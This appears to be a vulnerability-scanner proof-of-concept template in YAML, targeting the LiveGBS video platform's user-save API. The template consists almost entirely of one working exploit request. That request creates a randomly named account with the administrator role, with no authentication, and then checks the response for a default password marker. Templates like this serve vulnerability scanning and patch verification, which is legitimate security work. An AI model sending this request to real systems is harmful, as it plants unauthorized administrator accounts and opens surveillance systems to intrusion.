name: poc-yaml-LiveGBS-user_save-User-addition
transport: http

set:
  username: randomLowercase(7)

rules:
  r0:
    request:
      method: GET
      path: /api/v1/user/save?ID=&Username={{username}}&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
    expression: response.status == 200 && response.body.bcontains(b'DefaultUserPassword') 

expression: r0() 


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140137358